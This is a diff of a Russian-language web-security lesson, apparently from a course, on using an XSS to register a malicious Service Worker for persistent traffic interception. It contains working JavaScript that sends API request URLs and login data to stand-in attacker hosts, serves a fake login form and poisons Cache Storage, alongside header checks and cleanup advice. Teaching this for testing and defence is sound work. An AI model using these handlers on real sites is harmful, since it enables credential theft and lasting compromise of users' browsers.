@@ -14,272 +14,165 @@ estimated_minutes: 36
 summary: "Как Service Worker превращает разовую XSS в постоянный перехват трафика и как это эксплуатировать."
 ---
 
-**Service Worker (SW)** — это фоновый скрипт, который браузер регистрирует для origin и который может **перехватывать все сетевые запросы** страницы (fetch-события), кэшировать ответы и работать даже при закрытой вкладке (в рамках PWA). Это мощнейший примитив: XSS, позволяющий зарегистрировать SW, превращается в **постоянный** компромисс origin — перехват запросов, подмена ответов, кража токенов из будущих сессий. SW — ключ к устойчивости и к задачам «XSS, которая переживает перезагрузку».
+## Вопрос, с которого всё начинается
 
-## Теория: жизненный цикл и область действия
+Ты нашёл XSS на `app.example`. Обычно это «разовая» победа: выполнил `alert(1)`, но как только вкладку закрыли или уязвимость исправили — всё закончилось.
 
-- SW регистрируется через `navigator.serviceWorker.register('/sw.js')`.
-- **Scope** определяется директорией скрипта: `/sw.js` → scope `/`; `/app/sw.js` → scope `/app/`. По умолчанию SW контролирует только свой scope.
-- Заголовок `Service-Worker-Allowed: /` позволяет расширить scope.
-- SW требует **secure context** (HTTPS или localhost).
-- Управление начинается после перезагрузки страницы (или через `clients.claim()`).
+А что если сделать XSS **постоянной**? Для этого есть механизм **Service Worker** — фоновый скрипт, который браузер регистрирует для origin и который может **перехватывать все сетевые запросы** страницы. Если через XSS зарегистрировать свой SW, он продолжит работать даже после закрытия вкладки. Сегодня разберём, как разовая инъекция превращается в устойчивый компромисс.
 
-Ошибка конфигурации: **scope слишком широкий** или возможность **загрузить `sw.js` с чужого хоста** (например, через JSONP/загрузку файла) — тогда вы контролируете все запросы origin.
+## Наш пример: найденная XSS
 
-## Теория: как SW усиливает XSS
-
-Обычная XSS действует, пока открыта вкладка. SW — нет:
-
-1. **Persistent hook.** SW живёт до явной отмены регистрации; жертва может закрыть вкладку — SW продолжит перехватывать запросы.
-2. **Request interception.** `fetch`-событие может читать/модифицировать **все** запросы origin: украсть токены из заголовков/URL, подменить ответ, отдать малварь.
-3. **Cache poisoning клиента.** SW кэширует подменённые ответы — «постоянная» отравленная версия приложения.
-4. **Cross-tab.** Один SW контролирует все вкладки origin.
-
-Итог: если у вас есть HTML/JS-инъекция, зарегистрировать SW = закрепиться в браузере жертвы.
-
-## Теория: векторы и ошибки
-
-- **XSS → SW.** Любая XSS позволяет `navigator.serviceWorker.register('/evil.js')` (если файл достижим) или через `URL.createObjectURL`.
-- **Import scripts.** SW может `importScripts('https://attacker/x.js')` — если CSP это разрешает.
-- **Пользовательские данные как `sw.js`.** Если приложение отдаёт пользовательский контент как JS с `Service-Worker-Allowed`, это прямая регистрация.
-- **Широкий scope + поддомен.** SW на `evil.target.com` не покроет `target.com` (разные origin), но SW на `target.com` покроет всё.
-- **Отмена.** `navigator.serviceWorker.getRegistrations().then(r=>r.forEach(x=>x.unregister()))` — защита/очистка.
-
-## Инструменты и команды
-
-Список зарегистрированных SW в DevTools → Application → Service Workers. Из консоли:
+У нас есть подтверждённая XSS на `app.example` — например, в поле комментария, которое отражается без экранирования. Вместо безобидного `alert(1)` выполним JavaScript, который регистрирует Service Worker:
 
 ```js
-navigator.serviceWorker.getRegistrations().then(rs => console.log(rs));
+navigator.serviceWorker.register('/uploads/evil-sw.js', {scope: '/'});
 ```
 
-Проверить, отдаётся ли `sw.js` и с каким scope:
+`register(script, {scope})` — регистрация SW. `scope: '/'` означает, что скрипт будет контролировать **весь** origin. Скрипт `evil-sw.js` нам нужно предварительно разместить там, где он достижим (например, через загрузку файла, см. «Если не сработало»).
 
-```bash
-curl -s -I https://target.local/sw.js | grep -iE 'content-type|service-worker-allowed'
-```
+## Шаг 1: что такое Service Worker
 
-Проверить доступность загрузки SW с чужого/пользовательского контента:
+Ключевые свойства SW, которые делают его опасным:
 
-```bash
-curl -s 'https://target.local/uploads/user.js' -I | grep -iE 'content-type|service-worker-allowed'
-```
+| Свойство | Значение |
+|----------|----------|
+| Scope | обычно `/` — весь origin |
+| Жизненный цикл | install → activate → fetch |
+| Персистентность | живёт после закрытия вкладки |
+| Хранилище | Cache Storage + IndexedDB |
+| Требование | HTTPS (или localhost) |
+| Управление | `navigator.serviceWorker.register(script, {scope})` |
 
-## Разобранный пример: XSS → постоянный перехват
+**Scope** определяется директорией скрипта: `/sw.js` даёт scope `/`, а `/app/sw.js` — только `/app/`. Заголовок `Service-Worker-Allowed: /` позволяет расширить scope. И главное: SW работает только в **secure context** (HTTPS или localhost).
 
-Шаг 1. Подтверждаем XSS (например, `alert(1)`).
+## Шаг 2: перехват fetch — кража токенов
 
-Шаг 2. Регистрируем SW, который перехватывает запросы и шлёт cookie/токены на ваш сервер:
+Внутри SW обработчик события `fetch` видит **каждый** запрос страницы и может его подменить. Вот наш `evil-sw.js`:
 
 ```js
-// evil-sw.js (размещён на вашем хосте или как blob)
 self.addEventListener('fetch', (e) => {
   const u = new URL(e.request.url);
   if (u.pathname.startsWith('/api/')) {
-    // логируем запрос на сервер атакующего
     fetch('https://attacker.example/log?u=' + encodeURIComponent(e.request.url));
   }
 });
 ```
 
-Шаг 3. На уязвимой странице:
+После перезагрузки страницы SW начинает контролировать origin, и все запросы к `/api/` логируются на сервер атакующего. Так утекают токены из заголовков и URL. Артефакт — запросы жертвы в твоём логе.
 
-```js
-navigator.serviceWorker.register('https://attacker.example/evil-sw.js', {scope: '/'});
-```
+## Шаг 3: подмена ответа
 
-Для кросс-ориджин SW нужен CORS/`Service-Worker-Allowed`; чаще SW кладут в same-origin-достижимый путь или используют blob.
-
-Шаг 4. После перезагрузки SW контролирует origin: запросы к `/api/` логируются. Докажите утечку в отчёте.
-
-## Разобранный пример: подмена ответа (клиентская cache poisoning)
-
-SW может вернуть жертве подменённый ответ на любой путь:
+SW может не только наблюдать, но и **отвечать** вместо сети. Это позволяет подменить, например, страницу логина и украсть учётные данные без изменения сервера:
 
 ```js
 self.addEventListener('fetch', (e) => {
   if (e.request.url.endsWith('/login')) {
-    e.respondWith(new Response('<form action="https://attacker/">...', {
-      headers: {'Content-Type': 'text/html'}
-    }));
+    e.respondWith(new Response(
+      '<form action="https://attacker.example/">...</form>',
+      {headers: {'Content-Type': 'text/html'}}
+    ));
   }
 });
 ```
 
-Так крадутся учётные данные даже без изменения сервера — «постоянный» фишинг внутри origin.
+`respondWith(...)` подменяет ответ на любой путь. Получается «постоянный» фишинг **внутри** origin: адрес настоящий, а форма — фальшивая. Так же можно подменить API-ответ и обойти клиентскую логику.
 
-## Частые ошибки
+## Шаг 4: почему это персистентно
 
-- **Считать XSS разовой.** С SW она становится персистентной.
-- **Игнорировать scope.** SW на поддомене не покроет основной домен; scope задаёт охват.
-- **Забывать про HTTPS.** SW работает только в secure context.
-- **Не проверять `Service-Worker-Allowed`.** Он может разрешить SW с неожиданного пути.
-- **Не уметь чистить.** Для защиты/теста нужно уметь `unregister` и чистить Cache Storage.
+SW — единственный веб-механизм, который **переживает** закрытие вкладки и очистку JS-контекста. Он регистрируется один раз и продолжает работать. Более того, он может закэшировать поддельные ответы в **Cache Storage**, и тогда подделка сохранится даже после исправления на сервере:
 
-## Механика персистентности: почему SW так опасен
-
-Service Worker — единственный веб-механизм, который **переживает** закрытие вкладки и очистку JS-контекста. Он регистрируется один раз и продолжает работать.
-
-| Свойство | Значение |
-|----------|----------|
-| Область (scope) | обычно `/` — весь origin |
-| Жизненный цикл | install → activate → fetch |
-| Персистентность | сохраняется после закрытия вкладки |
-| Хранилище | Cache Storage + IndexedDB |
-| Обновление | проверяется при навигации, старый SW живёт до активации нового |
-| Требование | HTTPS (или localhost) |
-| Управление | `navigator.serviceWorker.register(script, {scope})` |
-
-```javascript
-// регистрация SW с областью на весь origin
-navigator.serviceWorker.register('/sw.js', { scope: '/' });
-```
-
-Ключевой момент для атакующего: если есть XSS и возможность зарегистрировать SW, вредоносный код становится **постоянным** — он отвечает на запросы и после ухода XSS-точки.
-
-## Перехват fetch: полная картина возможностей
-
-Внутри SW обработчик `fetch` видит **каждый** запрос страницы и может его подменить.
-
-```javascript
-// sw.js — перехват всех запросов
-self.addEventListener('fetch', (event) => {
-  event.respondWith(
-    fetch(event.request).then((resp) => {
-      // например, воруем тело запроса с токеном и подменяем ответ
-      if (event.request.url.includes('/api/me')) {
-        return new Response('<script>exfil()</script>', {
-          headers: { 'Content-Type': 'text/html' }
-        });
-      }
-      return resp;
-    })
-  );
-});
-```
-
-Возможности: подмена HTML (XSS на каждой навигации), кража тела POST (креды, токены), подмена API-ответов (обход логики), кэширование подделок (клиентский cache poisoning).
-
-## Векторы внедрения вредоносного SW
-
-| Вектор | Как работает |
-|--------|--------------|
-| Stored XSS | зарегистрировать SW с `/` scope |
-| JSONP/importScripts | `importScripts('//attacker/sw.js')` в легитимном SW |
-| Подмена SW-скрипта | если `/sw.js` отдаётся с user-content |
-| Открытый редирект | SW-скрипт с чужого домена через редирект |
-| Устаревший SW | старый SW не обновляется и продолжает работать |
-| Shared scope | два приложения на одном origin делят SW |
-
-```bash
-# проверяем, какие SW зарегистрированы (в браузере)
-# DevTools -> Application -> Service Workers
-# или из консоли:
-navigator.serviceWorker.getRegistrations().then(r => console.log(r))
-```
-
-## Заголовок Service-Worker-Allowed и scope-эскалация
-
-По умолчанию SW может управлять только своей директорией. Заголовок `Service-Worker-Allowed: /` расширяет scope.
-
-```bash
-# если /js/sw.js отдаётся с этим заголовком, он может контролировать весь origin
-curl -sI https://app.example/js/sw.js | grep -i 'service-worker-allowed'
-# Service-Worker-Allowed: /
-```
-
-Опасность: любой XSS в подкаталоге (`/js/...`) получает SW на весь сайт. Проверяйте этот заголовок при аудите.
-
-## Разобранный пример: XSS → постоянный перехват
-
-```javascript
-// 1) через найденную XSS регистрируем SW
-navigator.serviceWorker.register('/uploads/evil-sw.js', {scope: '/'});
-// 2) evil-sw.js (загружен на тот же origin) перехватывает запросы
-self.addEventListener('fetch', (e) => {
-  if (e.request.url.endsWith('/login')) {
-    // сохраняем пароль, отправляя его на наш сервер
-    e.respondWith(fetch(e.request.clone()).then(r => {
-      r.clone().text().then(b => fetch('//attacker/steal?b='+btoa(b)));
-      return r;
-    }));
-  }
-});
-// 3) даже после исправления XSS SW продолжает работать
-```
-
-Доказательство: после «исправления» XSS вредоносный перехват сохраняется — нужно явно дерегистрировать SW.
-
-## Что делать дальше / решение
-
-1. **Проверьте заголовки.** `Service-Worker-Allowed`, `Content-Type` SW-скрипта.
-2. **Найдите внедряемый SW.** User-content в `/sw.js` или путь с XSS.
-3. **Проверьте importScripts.** Может ли легитимный SW подгружать чужой код.
-4. **Смоделируйте XSS→SW.** Зарегистрировать SW через XSS и перехватить запрос.
-5. **Оцените персистентность.** Работает ли перехват после закрытия вкладки/фикса.
-6. **Зафиксируйте PoC.** Скрипт SW + перехваченные данные.
-
-## Практика и справочники
-
-- **PortSwigger Academy** — «Service worker» (тема client-side).
-- **MDN** — Service Worker API (scope, lifecycle).
-- **HackTricks** — «Service Workers».
-- **Google Web Fundamentals** — «Service Workers: an Introduction».
-
-## Cache Storage и клиентский cache poisoning
-
-Service Worker может кэшировать поддельные ответы так, что они переживут перезагрузку и очистку сети.
-
-```javascript
-// sw.js: кладём в кэш поддельный ответ
+```js
 self.addEventListener('fetch', (e) => {
   if (e.request.url.endsWith('/app.js')) {
     e.respondWith(
-      caches.open('poison').then((c) =>
-        c.put('/app.js', new Response('/* malicious */', {
-          headers: { 'Content-Type': 'application/javascript' }
-        }))
-      ).then(() => caches.match('/app.js'))
+      caches.open('poison').then(c => c.put('/app.js',
+        new Response('/* malicious */', {headers:{'Content-Type':'application/javascript'}})))
+      .then(() => caches.match('/app.js'))
     );
   }
 });
 ```
 
-Последствие: даже если сервер исправлен, браузер продолжает отдавать подделку из Cache Storage. Это делает SW-атаки особенно живучими.
+Именно поэтому XSS с регистрацией SW повышает severity до **persistent**: одного визита достаточно, чтобы закрепиться в браузере жертвы надолго.
 
-## Защита и её обходы
+## Шаг 5: векторы внедрения
+
+| Вектор | Как работает |
+|--------|--------------|
+| Stored XSS | зарегистрировать SW со scope `/` |
+| `importScripts` | легитимный SW подгружает чужой код (`importScripts('//attacker/sw.js')`) |
+| Подмена SW-скрипта | если `/sw.js` отдаётся с user-content |
+| Открытый редирект | SW-скрипт с чужого домена через редирект |
+| `Service-Worker-Allowed: /` | расширяет scope, давая XSS в подкаталоге контроль над всем сайтом |
+
+Заголовок `Service-Worker-Allowed` стоит проверять отдельно:
+
+```bash
+$ curl -sI https://app.example/js/sw.js | grep -i 'service-worker-allowed'
+Service-Worker-Allowed: /
+```
+
+Если `/js/sw.js` отдаётся с этим заголовком, любой XSS в `/js/` получает SW на весь origin.
+
+## Если не сработало
+
+- Кросс-origin SW не регистрируется без `Service-Worker-Allowed` — размести скрипт на том же origin (через загрузку файла, JSONP или user-content).
+- CSP с `worker-src` может блокировать регистрацию — проверь политику.
+- SW не активен сразу — он управляет страницей после перезагрузки или после `clients.claim()`.
+- Старый SW не обновляется мгновенно: он живёт до активации нового — это играет на руку атакующему.
+- Для очистки (при тесте/защите): `navigator.serviceWorker.getRegistrations().then(rs => rs.forEach(r => r.unregister()))`.
+
+## Как проверять и чем защищаться
+
+Начать стоит с инвентаризации уже зарегистрированных SW — они видны в DevTools (Application → Service Workers) или из консоли:
+
+```js
+navigator.serviceWorker.getRegistrations().then(rs => console.log(rs));
+```
+
+Затем проверь сам скрипт и его scope:
+
+```bash
+$ curl -s -I https://app.example/sw.js | grep -iE 'content-type|service-worker-allowed'
+content-type: application/javascript
+```
+
+А также — может ли SW-скрипт подтянуть чужой код через `importScripts`, и не отдаётся ли `sw.js` с пользовательским содержимым.
+
+Защита и типичные обходы:
 
 | Защита | Обход |
 |--------|-------|
 | SW-скрипт с `Content-Type: application/javascript` | внедрение через user-content с правильным типом |
 | Ограничение scope директорией | XSS в нужной директории / `Service-Worker-Allowed` |
 | `importScripts` с same-origin | редирект или JSONP-подгрузка |
-| CSP `worker-src` | если не задан — регистрация проходит |
+| CSP `worker-src` | если не задан — регистрация проходит с любого разрешённого источника |
 | Проверка обновлений | старый SW живёт до активации нового |
 
-```bash
-# проверить CSP на наличие worker-src
-curl -sI https://app.example/ | grep -i 'content-security-policy'
-# отсутствие worker-src -> SW можно зарегистрировать с любого разрешённого источника
-```
+## Что мы теперь знаем
 
-## Что делать дальше / решение
+- Service Worker — фоновый скрипт, перехватывающий запросы origin.
+- Scope определяется директорией скрипта; `Service-Worker-Allowed` его расширяет.
+- Обработчик `fetch` читает и подменяет запросы (кража токенов, подмена ответов).
+- SW переживает закрытие вкладки, а Cache Storage — даже фикс на сервере.
+- XSS с регистрацией SW становится **постоянным** компромиссом.
+- Векторы: stored XSS, `importScripts`, user-content как `sw.js`, редирект.
 
-1. Проверьте заголовки SW-скриптов и `Service-Worker-Allowed`.
-2. Найдите возможность внедрить SW (XSS, user-content, JSONP).
-3. Смоделируйте перехват `fetch` и кражу запросов.
-4. Оцените персистентность и Cache Storage.
-5. Оформите PoC: скрипт SW + перехваченные данные.
+## На что смотреть дальше
 
-## Практика
-
-- **MDN Service Worker API** — lifecycle, scope, Cache Storage.
-- **PortSwigger** — client-side «Service workers».
-- **HackTricks** — `Service Workers`.
+- Не считай XSS разовой: проверь, можно ли через неё зарегистрировать SW.
+- Проверяй заголовки SW-скриптов и `Service-Worker-Allowed`.
+- Смотри CSP на `worker-src`: его отсутствие упрощает регистрацию.
+- Помни про `importScripts`: легитимный SW может подтянуть чужой код.
+- Для отчёта покажи персистентность: перехват работает **после** закрытия вкладки.
+- Помни про Cache Storage: поддельные ответы могут пережить даже исправление на сервере.
+- Проверяй `importScripts` в легитимном SW — так чужой код попадает в доверенный скрипт без XSS.
+- Если сайт отдаёт `Service-Worker-Allowed: /`, SW из поддиректории управляет **всем** origin — это стоит проверить первым делом.
+- При реагировании на инцидент недостаточно починить сервер: нужно ещё отозвать SW у клиентов (например, через `registration.unregister()`), иначе браузеры продолжат отдавать поддельные ответы из кеша.
 
 ## Квиз
 
-Выберите один вариант в каждом вопросе.
+Проверь себя.
 
 ```quiz
 - question: "Почему Service Worker делает XSS персистентной?"
@@ -323,6 +216,10 @@ curl -sI https://app.example/ | grep -i 'content-security-policy'
   answer: 0
   explanation: "Регистрации снимаются через `unregister()`."
 ```
+
+## Куда дальше
+
+В следующем уроке мы разберём **DOM clobbering** (`web-dom-clobbering`): как HTML-элементы с определёнными `id`/`name` подменяют JavaScript-переменные. А пока главное запомни: если есть XSS и возможность зарегистрировать Service Worker — вредоносный код становится постоянным и переживает исправление уязвимости.
 
 ## Где пригодится
 
